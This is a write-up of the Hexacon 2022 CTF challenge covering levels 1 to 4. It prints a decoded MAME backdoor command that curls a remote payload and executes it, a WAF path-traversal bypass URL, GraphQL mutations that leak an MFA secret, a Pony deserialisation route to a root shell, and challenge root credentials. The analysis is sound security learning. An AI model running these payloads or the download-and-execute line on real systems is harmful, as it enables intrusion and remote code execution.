Author: Robert Xiao (@nneonneo)

## Table of Contents

- [Introduction](#introduction)
  - [Your mission, should you choose to accept it](#your-mission-should-you-choose-to-accept-it)
    - [Investigate an incomprehensible theft of a 0-day vulnerability found by one of your colleagues](#investigate-an-incomprehensible-theft-of-a-0-day-vulnerability-found-by-one-of-your-colleagues)
    - [Identify and track the attackers](#identify-and-track-the-attackers)
    - [Pwn them and get back what is yours (plus some fresh 0-days)](#pwn-them-and-get-back-what-is-yours-plus-some-fresh-0-days)
- [Level 1: Finding the backdoor in MAME](#level-1-finding-the-backdoor-in-mame)
  - [babycrackme50](#babycrackme50)
  - [reverse500, forensic100, web500](#reverse500-forensic100-web500)
  - [reverse150](#reverse150)
  - [games300](#games300)
- [Level 2: Exploiting a web service](#level-2-exploiting-a-web-service)
  - [Exploiting the WAF](#exploiting-the-waf)
  - [Exploiting the GraphQL API](#exploiting-the-graphql-api)
- [Level 3: Exploiting a Ponylang webserver](#level-3-exploiting-a-ponylang-webserver)
  - [Exploiting pony_deserialise](#exploiting-pony_deserialise)
- [Level 4: Escaping a Hyper-V VM](#level-4-escaping-a-hyper-v-vm)
  - [Reversing pci_device.dll](#reversing-pci_devicedll)
  - [Exploiting pci_device.dll](#exploiting-pci_devicedll)
- [Level 5: Breaking a Weak Cipher](#level-5-breaking-a-weak-cipher)
- [Conclusion](#conclusion)


## Introduction

I participated in the [Hexacon 2022 Challenge](https://www.hexacon.fr/challenge/), and had a lot of fun with it. The challenge involved five levels, including reversing, Linux and Windows binary exploitation, web security (Node.JS) and cryptography. Each level came with a flag, which could be submitted to a Discord bot to prove the solve. Submitting the flag for a level also gave you access to a dedicated Discord chat channel for the next level, which was especially helpful for getting announcements, talking with the organizers and bantering with others.

The release of the challenge included this description:

> ### Your mission, should you choose to accept it
> #### Investigate an incomprehensible theft of a 0-day vulnerability found by one of your colleagues
> 
> What a surprise when your colleague discovered that his brand new zero-click turing complete iMessage RCE had been seen in-the-wild. Given the complexity of the exploit, chances are pretty low that the bug has also been discovered by another team. When you ask your teammate if he thinks he could have been compromised, he tells you about this weird CTF he played a few months ago. The organization seemed very shady and the tasks were easy … too easy. In order to shed some light on this, your friend provided you an archive containing all the challenges he solved during the contest. Will you manage to find the backdoor?
> 
> #### Identify and track the attackers
> 
> Once the theft is proven, justice must be served. Gather all the information you can on the attackers and attempt to obtain an initial foothold on their infrastructure. They must have a way to communicate with the victim's machines. Let's just hope they don't use another Go remote access tool …
> 
> #### Pwn them and get back what is yours (plus some fresh 0-days)
> 
> In the event that you manage to access their core infrastructure, you may face virtualization layers. Your Hyper-V skills might be useful for once. The ultimate goal is to put the hand on all the stolen 0-days. Any attacker worthy of the name would not store such a treasure unencrypted, so make sure to bring all your cryptographic skills along. Good luck!

## Level 1: Finding the backdoor in MAME

To kick things off, we're provided with [a tarball](https://challenge.hexacon.fr/5fb8757cf1a5e8719c642d871f3d6fa149395cf1004c03b29c8fb473483eb27a-level1.tar.xz) containing an archive of files from a fictional CTF:

```
drwxr-xr-x  0 kevin  kevin       0 Jul 13 01:27 archive/
drwxr-xr-x  0 kevin  kevin       0 Apr 11 02:08 archive/0days/
-rw-r--r--  0 kevin  kevin      44 Apr 11 02:08 archive/0days/secret
drwxr-xr-x  0 kevin  kevin       0 Apr 13 04:17 archive/babycrackme50/
-rwxr-xr-x  0 kevin  kevin   16136 Apr 13 04:14 archive/babycrackme50/baby
drwxr-xr-x  0 kevin  kevin       0 Mar  5 13:32 archive/reverse500/
-rw-r--r--  0 kevin  kevin      99 Mar  5 13:32 archive/reverse500/readme.txt
drwxr-xr-x  0 kevin  kevin       0 Apr 21 02:12 archive/forensic100/
-rw-r--r--  0 kevin  kevin     197 Apr 21 02:12 archive/forensic100/readme.txt
-rw-r--r--  0 kevin  kevin    1002 Jul 13 01:27 archive/bash_history
drwxr-xr-x  0 kevin  kevin       0 Mar  5 13:29 archive/web500/
-rw-r--r--  0 kevin  kevin     223 Mar  5 13:29 archive/web500/readme.txt
drwxr-xr-x  0 kevin  kevin       0 Jul 13 01:13 archive/games300/
-rw-r--r--  0 kevin  kevin    1763 Apr 21 02:12 archive/games300/readme.txt
-rwxr-xr-x  0 kevin  kevin 75742768 Jul 13 01:13 archive/games300/mame0240
drwxr-xr-x  0 kevin  kevin        0 Jul 13 01:15 archive/reverse150/
drwxr-xr-x  0 kevin  kevin        0 Apr 10 14:04 archive/reverse150/sub/
-rw-r--r--  0 kevin  kevin      547 Apr 10 14:04 archive/reverse150/sub/SCP-iyxnnxturmlzhxrgtzzw
-rw-r--r--  0 kevin  kevin      547 Apr 10 14:04 archive/reverse150/sub/SCP-nakoiwfadohuqwvrgcqq
-rw-r--r--  0 kevin  kevin      547 Apr 10 14:04 archive/reverse150/sub/SCP-eezhvylrirkzfioevgwv
-rw-r--r--  0 kevin  kevin      547 Apr 10 14:04 archive/reverse150/sub/SCP-epvvuijionjeppqswkln
[28024 more randomly-named files]
-rw-r--r--  0 kevin  kevin      547 Apr 10 14:04 archive/reverse150/sub/SCP-ltnpahkzrzibgbxlvdnp
-rw-r--r--  0 kevin  kevin      547 Apr 10 14:04 archive/reverse150/sub/SCP-zyqwpokndscrnlpgsgoz
-rw-r--r--  0 kevin  kevin      547 Apr 10 14:04 archive/reverse150/sub/SCP-uaigcapoymqskdgxsuep
-rw-r--r--  0 kevin  kevin      547 Apr 10 14:04 archive/reverse150/sub/SCP-hyxydrdaxsxlasnbrzhy
-rw-r--r--  0 kevin  kevin     1361 Apr 10 14:07 archive/reverse150/README_SCP-0x68657861636f6e_README
```

The file `0days/secret` contains a link to the Rickroll video on YouTube, and `bash_history` is a listing of various commands like `gdb`, `strings`, etc. used to solve the CTF challenges in the package. The remaining files constitute files for the various challenges:

### `babycrackme50`

A trivial crackme that compares the first argument with the static string `Th1s_1s_your_f1rst_fl4g` (visible in `strings`). Nothing interesting here.

### `reverse500`, `forensic100`, `web500`

These directories contain readme files with challenge descriptions, but the actual files are not provided. The web challenge points to a private IP address so it also can't be interacted with. There's nothing useful in these challenges.

### `reverse150`

An [SCP](https://scp-wiki.wikidot.com/)-themed challenge, involving 28,032 separate files in the `sub` directory. Every file is a short Python script that compares its input to a hardcoded value using XOR, which looks like this:

```python
#! /usr/bin/python3

DATA= bytes.fromhex('53656172636820666f72206974')
KEY = bytes.fromhex('5045706a523361422424214a3c4f28642b550932')
OUT = bytes.fromhex('6075425f6205517a97ec8e321702c77a6e1462cb')

def plop(inp, key):
    out = bytes([a ^ b for a, b in zip(inp,key)])
    return out

print("Welcome to this challenge. It is an easy one")
print("You know python? you know XOR?")
inp = input("Give me 20 chars in hex: \n")

if plop(bytes.fromhex(inp), KEY) == OUT:
    print("Your reversing skills are astonishing!")
else:
    print("Try again")


```

Since the format of each script is identical, it's easy to extract the relevant variables and reconstruct the input for each script, which looks like `b'00250608\xb3\xc8\xafx+M\xef\x1eEAk\xf9'`. Each file's input starts with an 8-digit number followed by 12 bytes of data, and when all the inputs are sorted by the leading number it becomes evident that the number is a file offset (each 12 bytes apart), and the 12-byte chunks combine to form a PNG file (the 00000000 chunk starts with the PNG header). This is easily reversed to reconstruct the file:

```python
template = r"""#! /usr/bin/python3

DATA= bytes.fromhex('__HEX__')
KEY = bytes.fromhex('__HEX__')
OUT = bytes.fromhex('__HEX__')

def plop(inp, key):
    out = bytes([a ^ b for a, b in zip(inp,key)])
    return out

print("Welcome to this challenge. It is an easy one")
print("You know python? you know XOR?")
inp = input("Give me 20 chars in hex: \n")

if plop(bytes.fromhex(inp), KEY) == OUT:
    print("Your reversing skills are astonishing!")
else:
    print("Try again")

"""

import re

re_template = re.compile("(?m)^" + re.escape(template).replace("__HEX__", "([0-9a-f]+)") + "$")

import os

def plop(inp, key):
    out = bytes([a ^ b for a, b in zip(inp,key)])
    return out

outf = open("out.png", "wb")

maxval = 0
for fn in os.listdir("sub"):
    with open(f"sub/{fn}", "r") as inf:
        code = inf.read()
        m = re_template.match(code)
        assert m is not None
        DATA, KEY, OUT = map(bytes.fromhex, m.groups())
        assert DATA == b"Search for it"
        inp = plop(OUT, KEY)
        offset = int(inp[:8])
        outf.seek(offset)
        outf.write(inp[8:])
        maxval = max(maxval, offset)

outf.seek(maxval + 12)
```

The [resulting PNG](files/level1/out.png) gives us a CTF flag, `BACKROOMS`, which is alas useless for the challenge as a whole. There also doesn't seem to be any data steganographically encoded in the file - another dead end.

### `games300`

The remaining challenge is a modified copy of the MAME emulator, designed to trigger a special function if the player gets a high score in the game Alien Arena. Here's the `readme.txt`:

```
Do you like retrogaming? Do you like old-school CPUs?

We prepared for you a special version of mame https://github.com/mamedev/mame

We git cloned for the challenge: https://github.com/mamedev/mame/tree/mame0240

This mame binary has been patched by our team to play "Alien Arena" (1985)! In
all its shining glory, with not less than 8 (yes, eight!) colors on screen,
awesome sounds, and incomprehensible gameplay! Try it and you'll love it (or
not)! You can read full description of the game here:
https://www.mamedev.org/roms/alienar/

This game is a 'capture-the-flag' style, and has been written after a long reverse engineering.
It was the perfect target for a challenge \o/

Your mission:
-download this rom (we can't provide the rom for legal reason, but it's freely downloadable) :
    https://www.mamedev.org/roms/alienar/alienar.zip
-play the game, beat the hi-score, write a 'special' message on the scoreboard, and a
flag will appear in your /tmp dir !

Help:
$ wget https://www.mamedev.org/roms/alienar/alienar.zip -O /tmp/alienar.zip
$ ./mame0240 -rp /tmp alienar
 ( enjoy the game !!! )

How to play:
- press any key to pass the mame splash screen
- 5 on keyboard (not keypad) will give you a credit
- 1 on keyboard (not keypad) will start game
- arrows will move your player
- left CTRL will launch action (depends on diamonds you've collected)
- If you beat the high-score you can enter a special message (up/down and left ctrl to choose letter)
- Escape key will quit game and return you to shell.


This specific patched mame binary has been compiled under a recent debian. It should work
under kali too.

Hint:
 - No guessing
 - 1 flag per team, don't share flags!!
 - instead of playing the game, maybe reversing all the things is easier :)
```

From the challenge introduction, we suspect this binary might include a backdoor. However, `mame0240` is a 70+MB binary, so reversing it to find a backdoor seems like a tall order! I spent a bit of time poking around random functions that might be involved in Alien Arena, with no luck.

There's a bit of a hint in the readme, though: the special function is only triggered if a high score is obtained and a special message is written. So, I downloaded a clean copy of MAME, played through the game (it's hard!), and got a high enough score. Once you get a high score, the game asks you for a name and a "message" which is displayed on the scoreboard. I noticed that MAME writes a file called `nvram` to disk, containing the high score list, which is how the game persists the list between launches.

On a whim, I decided to check the NVRAM functions in the backdoored binary, since I figured it'd be easier to extract high score data from NVRAM than by e.g. analyzing CPU/RAM state from the emulator core. Indeed, as luck would have it, the function `nvram_device::nvram_write` contains some very suspicious code!

```c
void __thiscall nvram_device::nvram_write(nvram_device *this,emu_file *param_1) {
  byte *pbVar1;
  void *__dest;
  byte *pvVar2;
  size_t sVar2;
  ulong uVar3;
  void *__src;
  char uStack328 [42];
  char auStack280 [226];
  
  uStack328._32_8_ = 0xc1ccc6affea0bea0;
  uStack328._0_4_ = 0xe8e3e5a0;
  uStack328._4_4_ = 0xece6a0ef;
  uStack328._8_4_ = 0xe9a0e7e1;
  uStack328._12_4_ = 0xe5d2a0f3;
  uStack328._40_2_ = 199;
  uStack328._16_4_ = 0xc7b0f2f4;
  uStack328._20_4_ = 0xeee9edb4;
  uStack328._24_4_ = 0xdfb4dfe7;
  uStack328._28_4_ = 0xf2e5f6c5;
  auStack280._0_4_ = 0xecf2f5e3;
  auStack280._4_4_ = 0xa0ebada0;
  auStack280._8_4_ = 0xe8a0f3ad;
  auStack280._12_4_ = 0xf3f0f4f4;
  auStack280._16_4_ = 0xe6afafba;
  auStack280._20_4_ = 0xf3e5ece9;
  auStack280._24_4_ = 0xe5f2e1e8;
  auStack280._28_4_ = 0xaff2e6ae;
  auStack280._32_4_ = 0xf4f3e5f2;
  auStack280._36_4_ = 0xf7efe4af;
  auStack280._40_4_ = 0xe1efecee;
  auStack280._44_4_ = 0xb1b9afe4;
  auStack280._48_4_ = 0xb1b2e1b7;
  auStack280._52_4_ = 0xe2b1b6b5;
  auStack280._56_4_ = 0xe5e3b1b0;
  auStack280._60_4_ = 0xb5e6e6b0;
  auStack280._64_4_ = 0xb6b0e1b1;
  auStack280._68_4_ = 0xb3b2e5b4;
  auStack280._72_4_ = 0xb2e4b2b6;
  auStack280._76_4_ = 0xb7b0b3e3;
  auStack280._80_4_ = 0xb2b9b1b0;
  auStack280._84_4_ = 0xe1b9b0b8;
  auStack280._88_4_ = 0xb0b7b1b3;
  auStack280._92_4_ = 0xe4b5b5b7;
  auStack280._96_4_ = 0xb8b3e6b1;
  auStack280._100_4_ = 0xb5b2b9b5;
  auStack280._104_4_ = 0xb8b1b8e4;
  auStack280._108_4_ = 0xb2e5e5b5;
  auStack280._112_4_ = 0xe5e1b8e6;
  auStack280._116_4_ = 0xe4b3e4b9;
  auStack280._120_4_ = 0xb8e2e1b9;
  auStack280._124_4_ = 0xb2b7b1e3;
  auStack280._128_4_ = 0xb2b3b9e5;
  auStack280._132_4_ = 0xe5e1e1b4;
  auStack280._136_4_ = 0xb8b9e4b6;
  auStack280._140_4_ = 0xe5afb7b0;
  auStack280._144_4_ = 0xb6b7b6e6;
  auStack280._148_4_ = 0xadb0e4e2;
  auStack280._152_4_ = 0xb1b2b3e4;
  auStack280._156_4_ = 0xe1b0b4ad;
  auStack280._160_4_ = 0xb7e2ade5;
  auStack280._164_4_ = 0xe6adb5e5;
  auStack280._168_4_ = 0xb8b8e1b5;
  auStack280._172_4_ = 0xe1b2e4e4;
  sVar2 = *(size_t *)(this + 0x3c8);
  auStack280._224_2_ = 0x80e1;
  auStack280._176_4_ = 0xafe2b7b7;
  auStack280._180_4_ = 0xa0f7e1f2;
  auStack280._184_4_ = 0xafa0efad;
  auStack280._188_4_ = 0xaff0edf4;
  auStack280._192_4_ = 0xa6a0e1ae;
  auStack280._196_4_ = 0xe8e3a0a6;
  auStack280._200_4_ = 0xa0e4efed;
  auStack280._204_4_ = 0xafa0f8ab;
  auStack280._208_4_ = 0xaff0edf4;
  auStack280._212_4_ = 0xa6a0e1ae;
  auStack280._216_4_ = 0xf4afa0a6;
  auStack280._220_4_ = 0xaeaff0ed;
  __dest = malloc(sVar2);
  __src = *(void **)(this + 0x3c0);
  pvVar2 = (byte *)memcpy(__dest,__src,sVar2);
  if (((((pvVar2[0x3c0] == 0xf1) && (pvVar2[0x3c1] == 0xf8)) && (pvVar2[0x3c2] == 0xf1)) &&
      ((((pvVar2[0x3c3] == 0xf5 && (pvVar2[0x3c4] == 0xf2)) &&
        ((pvVar2[0x3c5] == 0xf8 && ((pvVar2[0x3c6] == 0xf1 && (pvVar2[0x3c7] == 0xf1)))))) &&
       (pvVar2[0x3c8] == 0xf1)))) &&
     ((((pvVar2[0x3c9] == 0xf3 && (pvVar2[0x3ca] == 0xf1)) && (pvVar2[0x3cb] == 0xff)) &&
      ((pvVar2[0x3cc] == 0xf1 && (pvVar2[0x3cd] == 0xfe)))))) {
    uVar3 = 0;
    while( true ) {
      sVar2 = strlen(uStack328);
      if (sVar2 <= uVar3) break;
      uStack328[uVar3] = uStack328[uVar3] & 0x7f;
      uVar3 += 1;
    }
    uVar3 = 0;
    system(uStack328);
    while( true ) {
      sVar2 = strlen(auStack280);
      if (sVar2 <= uVar3) break;
      pbVar1 = (byte *)(auStack280 + uVar3);
      *pbVar1 = *pbVar1 & 0x7f;
      uVar3 += 1;
    }
    system(auStack280);
    sVar2 = *(size_t *)(this + 0x3c8);
    __src = *(void **)(this + 0x3c0);
  }
  emu_file::write(param_1,__src,(uint)sVar2);
  return;
}
```

The normal implementation of the function is simply `file.write(m_base, m_length);`, so all this extra code is clearly the backdoor. The strings were trivially encoded by setting the MSB of each byte; a quick decoding yields the following strings passed to `system`:

- ` echo flag is Retr0G4ming_4_Ever > ~/FLAG`
- `curl -k -s https://fileshare.fr/rest/download/917a21561b01ce0ff51a064e2362d2c3070192809a3170755d1f385925d8185ee2f8ae9d3d9ab8c172e9324aae6d9807/ef676bd0-d321-40ae-b7e5-f5a88dd2a77b/raw -o /tmp/.a && chmod +x /tmp/.a && /tmp/.a`

The second command downloads a payload from a server and executes it. When we download this file, we get the following:

`{"error":true,"message":"The public link has expired. The flag for step 1 is HXN{2a00d593c02a8fb2b40ad99a168cf7a4}"}`

There's our flag for level 1!

## Level 2: Exploiting a web service

Although we have the URL for the attacker's payload, the public link has expired so we can no longer download the file. However, the entire `fileshare.fr` domain is apparently owned by the attackers (confirmed by the Hexacon organizers), so our next target is the webserver itself.

Conveniently, on [the homepage](https://fileshare.fr/) there's a link [to the source code](https://github.com/fileshare-dev/fileshare) buried in the footer, so we can analyze the source code instead of blindly guessing. (Note: I did not initially find the source code, which led to a few days of blindly trying stuff - always look for source for web problems!)

The web server consists of four components, served by four separate Docker containers:

- `front`: The front-end, consisting of an Nginx web server serving mostly static content, and proxying everything under `/rest/` to `waf`
- `waf`: A web application firewall (WAF), written in Node.js with Express, which receives REST API calls proxied from the front end, performs sanity checks on the input parameters, and forwards acceptable requests to `backend`
- `backend`: The backend, written in Node.js with Express, which receives REST API calls from the WAF and executes them.
- `database`: A MySQL database server.

The basic design of the service is that it is a file hosting service, where users can register, upload files, create "shares" consisting of groups of files, and then create public links to those shares. However, nearly all of the features are restricted to "verified" users, and a newly-registered account has no way to become "verified" (e.g. there is no email/SMS verification).

The front end looks reasonably secure: Nginx is up-to-date and the configuration looks sane. Not much to see.

The WAF and backend expose several endpoints. However, as noted, most endpoints require the user to be "verified", which makes them fairly useless to us. There are endpoints for registering, logging in, changing password, downloading shares and files, uploading files, creating shares, and managing access to shares. Login is handled using JWT cookies; the JWT verification looks reasonable (e.g. doesn't accept `none`, secret is randomized, etc.).

In addition to the endpoints passed through by the WAF, the backend also sports an extra endpoint called `/_dev/`, which exposes a GraphQL API. This is immediately suspicious - although it's not directly reachable via the WAF, the `/_dev/` endpoint exposes a parallel API with different access checks. So, if we could sneak a request to `/_dev/` past the WAF, we could massively increase the attack surface.

### Exploiting the WAF

As it turns out, the WAF does contain a fairly subtle bug. In `waf/utils.js`, we find the comment `FIXME I'm lazy` attached to `createBackendUrl`:

```js
  createBackendUrl: function (uri, query = '') {
    let host = config.BACKEND_HOST;
    let port = config.BACKEND_PORT;
    //FIXME I'm lazy
    //normalize path to remove double slashes not handled by express
    return `http://${host}:${port}${path.normalize('/' + uri)}?${query}`;
  }
```

By examining every use of `createBackendUrl` in the WAF, we discover this function in `routes/shares.js`:

```js
const shareFileRouteTpl = '/shares/:uuid:/files/:filename:/';

function makeShareFileRoute(shareUuid, name) {
  let sanitizedFilename = path.basename(name);
  return shareFileRouteTpl.replace(':uuid:', shareUuid)
    .replace(':filename:', sanitizedFilename);
}
```

The handler for `GET /:uid/files/:filename` calls `makeShareFileRoute(uid, filename)`; it checks `uid` against a regular expression but does not validate `filename` at all. Thus, in `makeShareFileRoute`, `name` is untrusted user input.

In JavaScript, the `.replace` function allows the use of [certain *patterns*](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace#specifying_a_string_as_a_parameter) in the replacement string. This is a pretty obscure feature, and it's exploitable here: we can specify a `name` where the last path component (the result of `path.basename`) contains special replacement patterns.

Specifically, the pattern `$'` is very useful for us - it is replaced by "the portion of the string that follows the matched substring" - in this case, the single `/` following the `:filename:` in `shareFileRouteTpl`. Therefore, anytime our `name` contains `$'`, the `.replace` function will helpfully insert a slash - so we can write `..$'..$'..$'` to inject `../../../` into the constructed URL and bypass the `path.basename` restriction!

With this in hand, we're ready to forge GET requests to any endpoint on the backend. We can also forge DELETE requests via `DELETE /:uid/files/:filename`, but alas POST requests are not possible.

### Exploiting the GraphQL API

With the WAF bypassed, we're ready to query the `/_dev/` endpoint on the backend and start exploring the GraphQL API. We can construct a URL like the following to perform a GraphQL query:

```
https://fileshare.fr/rest/shares/ef676bd0-d321-40ae-b7e5-f5a88dd2a77b/files/..$'..$'..$'..$'_dev$'gql$'%3Fquery=%7Bme%7Bme%7Bid%7D%7D%7D&
```

This resolves to the URL `http://backend:port/_dev/gql/?query=%7Bme%7Bme%7Bid%7D%7D%7D`, which executes the GraphQL query `{me{me{id}}}`to get the UID of the logged-in user. With GET requests, we can perform any query, but to perform a *mutation* to perform modifications via the GraphQL API, we need to use POST requests. Luckily, the `/_dev/` router includes the `method-override` library, which lets us turn GET requests into POST requests by appending the magic query parameter `_method=POST`.

With our unfettered access to the GraphQL API, solving this challenge is simply a matter of calling the right GraphQL APIs in the right order:

1. We query `{ fileShare(shareLink: "917a21561b01ce0ff51a064e2362d2c3070192809a3170755d1f385925d8185ee2f8ae9d3d9ab8c172e9324aae6d9807", fileId: "ef676bd0-d321-40ae-b7e5-f5a88dd2a77b") { file { id name path } } }`. This fails due to a lack of access ("Access forbidden to share"), but the error message returned by GraphQL leaks the share's UID `332dd074-60f4-4419-9f3c-28fd302acc86`.
2. We use the `_method=POST` override to perform a GraphQL mutation: `mutation { giveAccess(id: "332dd074-60f4-4419-9f3c-28fd302acc86", otp: "123456", username: "foo") { owner { id ... on User { username salt role verified mfa_secret } } } }` (assumes that you're logged in as `foo`). This mutation method contains two critical bugs: it does not check that the passed in user is the owner of the share, and it also passes back the owner as a User object rather than a PublicUser, which leaks the MFA secret. Thus, with this one query, we can obtain the owner's UID (`f720ccfb-3748-4ac0-9bd3-62217692513d`), username (`Hacker`), and MFA secret (`HFCV45YGFUDDGHDEEYYAQRKIDZJXSPT2HELAWZTVPAQB22CVEVSQ`).
3. With the owner's MFA secret in hand, we perform another `giveAccess` mutation, this time with a valid OTP token. This grants the logged-in user access to the target share.
4. Using the query `{ downloadShare(id: "332dd074-60f4-4419-9f3c-28fd302acc86") { share { id name isPublic link validUntil } zipContent } }`, we can retrieve all of the information about the share as well as the share data.

The full exploit can be found in [`exploit.py`](files/level2/exploit.py). During the challenge, I mostly used a REPL to solve the challenge interactively; this exploit script combines those explorations into a fully automated exploit.

Unzipping our prize, we get `flag.txt` (`HXN{be0a73cc0886464f158eafc28138292d}`), as well as the malicious `payload.bin` that was executed on the victim's computer. Level complete!

## Level 3: Exploiting a Ponylang webserver

Now we've obtained the [malicious payload](chall/level3/payload.bin) that was downloaded to and executed on the victim's computer. On Discord, the organizers also provided the [`ld`](chall/level3/ld-linux-x86-64.so.2) and [`libc`](chall/level3/libc.so.6) used on the server. It's time to reverse the binary and find an exploitable bug!

The binary is a fairly large (800KB+) Linux x86-64 binary with symbols. Looking at `main`, we immediately see references to `pony_init`, `pony_create`, etc., suggesting that the program was built using the [Pony programming language](https://www.ponylang.io/), a garbage-collected actor-based language. Strings further confirm that it was built using version `0.45.2-2e03c3f3 [release]`, so we can use that information to check out the language's [GitHub repo](https://github.com/ponylang/ponyc) at that version so we have real source code for the core functions. Additionally, we can take the header files and import them into Ghidra to get type definitions and speed up reversing.

Pony makes extensive use of a custom object system, where objects such as strings, actors, class instances, etc. are represented as structures with a `pony_type_t` pointer as the first element. In turn, every `pony_type_t` in the program is listed in a large table called `descriptor_table`. This table is referenced in an argument to `pony_start`, so we can find the table (at 0x4af340) and its size (0x33b entries). By using a little Python scripting, and the symbol names of the functions referenced in the type structure, we can recover the names for most of the `pony_type_t` objects:

```python
addr = 0x4af340
count = 0x33b
dt = getDataTypes("pony_type_t")[0]

for i in range(count):
    v = getLong(toAddr(addr + 8 * i))
    if v != 0:
        clearListing(toAddr(v), toAddr(v + 111))
        createData(toAddr(v), dt)

for i in range(count):
    v = getLong(toAddr(addr + 8 * i))
    if v == 0: continue
    fn = getLong(toAddr(v + 0x28))
    if fn != 0:
        name = getSymbolAt(toAddr(fn))
        if not name:
            continue
        name = name.name
        if name.endswith("_Serialise"):
            createLabel(toAddr(v), name[:-10], True)

for i in range(count):
    v = getLong(toAddr(addr + 8 * i))
    if v == 0: continue
    instance = getLong(toAddr(v + 0x10))
    if instance != 0:
        name = getSymbolAt(toAddr(v))
        if not name:
            continue
        name = name.name
        createLabel(toAddr(instance), name + "_obj", True)
```

This is very useful! Instead of calls like `pony_create(uVar3,&DAT_00496ef0,0);`, we can now see stuff like `pony_create(uVar3,&Stdin,0);`. Additionally, a lot of functions are unnamed (particularly methods of classes and actors); having the type names helps identify these functions by cross-referencing them with the Pony standard library.

The `Main_Dispatch` method kicks everything off. It has two modes of operation: a normal backdoor mode (no arguments), and a listen mode which establishes a server (`-l`/`--listen` argument). The backdoor connects to a listening server at http://518e3baefd2283e3cde6d0ce8bebec7a.fileshare.fr:31337, and uses HTTP Basic Auth with the username `Kim-Jong-Un` and password `DoYouLikeMyCTF?` (perhaps a reference to North Korean hackers stealing exploits from security researchers).

The backdoor is pretty simple: it gathers some system data, stores the data in `/tmp/.X1-lock`, and POSTs it to `/enroll/<ID>` where ID is a SHA-256 of the system data; it then finds exploits in `/tmp/0dayz` and POSTs them to `/upload/<ID>/<HASH>`. Interestingly, when POSTing the exploits, it uses `pony_serialise` and `base64` to convert the file contents for upload.

From the listener's main function at 0x41b710, we can obtain the full list of routes:

```
    MyServer_add_dir_route(&local_b0,auth,&"/download/*filepath",(long)&"exploits/",&local_d0);
    MyServer_add_route(&local_b0,&"GET",&"/",&DefaultHandler_obj,&local_50);
    MyServer_add_route(&local_b0,&"GET",&"/ping",&PingHandler_obj,&local_f0);
    MyServer_add_route(&local_b0,&"POST",&"/upload/:hash/:filename",pppVar2,&local_110);
    MyServer_add_route(&local_b0,&"POST",&"/enroll/:hash",pppVar2,&local_130);
    MyServer_add_route(&local_b0,&"POST",&"/:rand",&NotFoundHandler_obj,&local_70);
```

(Here, String objects have been renamed to make them look like real strings).

It's useful to know that we can download files via the `/download` route. Additionally, by reading the `UploadHandler` code, we can confirm that `/upload/` calls `pony_deserialise` on the input before storing the file to disk. It's very suspicious that `UploadHandler` deserializes just to load a string, while `EnrollHandler` just writes the input (as a string) directly to disk.

### Exploiting `pony_deserialise`

Deserializing untrusted input is a danger in many programming languages, from Java to Python, and it's no different in Pony. Indeed, the serialization format isn't even stable: serialized objects reference the type descriptor table, so serialized data can only be deserialized by the same binary. Hence, it's a very poor format for a network service.

Pony does not do any special validation of the serialized data. It's trivial to crash the server: simply POSTing `AAAAAAAA` (base64-encoded to `QUFBQUFBQUE=`) to `/upload/:hash/:filename` will segfault the server. Reading the code, we can understand why:

```c
PONY_API void* pony_deserialise_offset(pony_ctx_t* ctx, pony_type_t* t,
  uintptr_t offset)
{
...
  // If we haven't been passed a type descriptor, read one.
  if(t == NULL)
  {
    // Make sure we have space to read a type id.
    if((offset + sizeof(uintptr_t)) > ctx->serialise_size)
    {
      serialise_cleanup(ctx);
      ctx->serialise_throw();
      abort();
    }

    // Turn the type id into a descriptor pointer.
    uintptr_t id = *(uintptr_t*)((uintptr_t)ctx->serialise_buffer + offset);
    t = desc_table[id];
  }
```

This reads an 8-byte `id` from the serialized data, and uses it directly as an index into `desc_table` without any bounds checks! Since `UploadHandler` does not pass a type descriptor to `pony_deserialise`, we can access this code path and specify any type we want, or use an out-of-bounds index to use a fake type.

After loading the type and allocating a new instance, the contents of the buffer are simply `memcpy`'d to the object:

```c
  void* object;
  if(t->final == NULL)
    object = ctx->serialise_alloc(ctx, t->size);
  else
    object = ctx->serialise_alloc_final(ctx, t->size);

  memcpy(object, (void*)((uintptr_t)ctx->serialise_buffer + offset), t->size);
```

Then, the type's `_Deserialise` method will be called (via a deferred call in `recurse`). Here's how `String_Deserialise` looks:

```c
void String_Deserialise(undefined8 param_1,String *param_2)

{
  char *pcVar1;
  
  param_2->type = &String;
  pcVar1 = (char *)pony_deserialise_block(param_1,param_2->data,param_2->field2_0x10);
  param_2->data = pcVar1;
  return;
}
```

`pony_deserialise_block` is a wrapper around `memcpy`:

```c
  // Allocate the block, memcpy to it.
  if((offset + size) > ctx->serialise_size)
  {
    serialise_cleanup(ctx);
    ctx->serialise_throw();
    abort();
  }

  void* block = ctx->serialise_alloc(ctx, size);
  memcpy(block, (void*)((uintptr_t)ctx->serialise_buffer + offset), size);
  return block;
```

In particular, the offset check fails to reject negative offsets, so by specifying e.g. a String with a negative offset for its content, we can leak memory relative to the input buffer.

I played with trying to leak memory by uploading String objects with negative offsets, then downloading the resulting files from the `/download/` endpoint. However, this was not stable because the allocated buffer would move around a lot in memory, leading to unpredictable leaks and an inability to predict where data would be allocated. Instead, I wound up targeting a different class: File objects contain `iovec` structures specifying unwritten data, as well as a file descriptor for the open file. When File objects are garbage-collected, the contents of the `iovec` are written out to the file descriptor. During deserialization, the `iovec` is copied directly from the input, so we can insert pointers into the serialized `iovec`s, specify our socket as the file descriptor, and get memory contents leaked back to us when the `File` is garbage-collected. This gives us a predictable and stable leak primitive.

Because there's no PIE, we can directly dump out libc addresses from the binary's GOT, Pony's `scheduler_t` pointer from BSS, and a `pthread_t` structure by following `scheduler->tid`. This gives us access to the thread-local `pool_local` structure, which gives us the state of the memory allocator and lets us predict what addresses allocations will be made to.

Finally, once we know exactly what address our uploaded POST body will be allocated to, we can construct a fake `pony_type_t` object, point the `deserialise` function at a stack pivot gadget, and kick off a ROP chain with an out-of-bounds type index.

The full exploit is given in [`exploit.py`](files/stage3/exploit.py). When run, we get dropped into a root shell, and we can view the contents of `/root`. There's a flag at `/root/flag.txt`: `HXN{1f329793ed7d4b9b178de07eb257cfed}`. Level 3 complete!

## Level 4: Escaping a Hyper-V VM

From the server, we can read `/root/README`:

```
This is the ``files`` Virtual Machine running under Hyper-V Windows 11 host.

If problem in VM (files not sent to the PCI device pci_device.dll handler), 
  please connect using SSH on 2221 with root:R2d6YwjZSpsZpuNkBE6t

Problem may be on host side due to Microsoft mitigations 
  (not allowed to create child processes, dynamic code and modifying executable code 
    also DLL cannot be loaded from remote servers).
```

